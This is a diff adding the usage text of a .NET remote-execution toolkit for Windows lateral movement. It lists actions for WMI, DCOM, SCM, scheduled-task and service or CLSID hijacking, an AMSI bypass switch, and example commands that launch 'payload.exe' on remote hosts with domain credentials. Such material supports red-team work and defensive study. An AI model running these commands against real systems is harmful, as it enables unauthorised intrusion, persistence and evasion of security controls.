@@ -1,0 +1,38 @@
+ABOUT
+    .NET authenticated remote execution toolkit. Supports WMI, SCM, DCOM, Task
+    Scheduler, service DLL hijack, DCOM server hijack, and modification of existing
+    services and scheduled tasks.
+
+USAGE:
+    net-sharp-move --- action=<action> computername=<host> [options]
+
+ACTIONS:
+    query           WMI query on remote host
+    create          WMI process creation
+    executevbs      Execute via WMI event subscription
+    taskscheduler   Create scheduled task
+    dcom            DCOM based execution (ShellBrowserWindow, etc.)
+    scm             Create and start Windows service
+    modsvc          Modify existing service binary path
+    modschtask      Modify existing scheduled task
+    hijackdcom      DCOM server hijack via CLSID
+    startservice    Start an existing service
+
+OPTIONS:
+    computername    Remote target hostname (required)
+    username        Authentication username
+    password        Authentication password
+    command         Command or executable path to run
+    query           WMI query string (for action=query)
+    servicename     Service name
+    taskname        Scheduled task name
+    eventname       WMI event name (for executevbs)
+    method          DCOM method (e.g. ShellBrowserWindow)
+    clsid           CLSID for DCOM hijack
+    amsi            Enable AMSI bypass (true/false)
+
+EXAMPLES:
+    net-sharp-move --- action=query computername=host.local query="select * from win32_process" username=DOMAIN\\user password=pass
+    net-sharp-move --- action=create computername=host.local command="C:\\windows\\temp\\payload.exe" amsi=true username=DOMAIN\\user password=pass
+    net-sharp-move --- action=dcom computername=host.local command="C:\\windows\\temp\\payload.exe" method=ShellBrowserWindow amsi=true
+    net-sharp-move --- action=scm computername=host.local command="C:\\windows\\temp\\payload.exe" servicename=WindowsDebug amsi=true
